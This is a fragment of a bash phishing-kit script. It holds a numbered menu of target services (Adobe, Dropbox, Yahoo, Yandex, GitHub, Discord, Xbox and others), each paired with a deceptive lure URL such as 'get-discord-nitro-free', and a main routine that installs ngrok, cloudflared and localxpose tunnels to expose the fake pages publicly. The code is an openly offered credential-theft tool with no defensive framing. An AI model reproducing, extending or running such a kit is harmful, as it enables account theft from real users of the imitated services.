			website="BLUEdit"
			mask='http://BLUEdit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='http://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='http://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='http://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='http://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='http://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='http://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='http://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='http://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='http://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='http://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='http://get-discord-nitro-free'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${BLUE}[${WHITE}!${BLUE}]${BLUE} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_ngrok
install_cloudflared
install_localxpose
main_menu
